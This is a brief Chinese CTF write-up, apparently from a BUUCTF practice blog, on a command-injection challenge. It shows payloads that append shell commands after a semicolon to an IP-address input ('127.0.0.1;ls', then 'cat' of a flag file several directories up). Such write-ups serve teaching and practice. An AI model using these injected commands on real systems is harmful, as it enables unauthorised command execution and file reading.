知识点：

1. 命令执行

2.  ;管道符的使用



1. paylaod:

```javascript
127.0.0.1;ls
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/24DBC0E71F304B87938E6F709220080Eclipboard.png)

确定存在命令执行



2. 寻找flag

```javascript
127.0.0.1;cd ..;cd ..;cd ..;ls
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/342759AEBC2A4982B0901B3BBE71254Bclipboard.png)



payload:

```javascript
127.0.0.1;cd ..;cd ..;cd ..;cat flag
```



也可以：

```javascript
127.0.0.1;cd ..;cat ../../../../flag
```

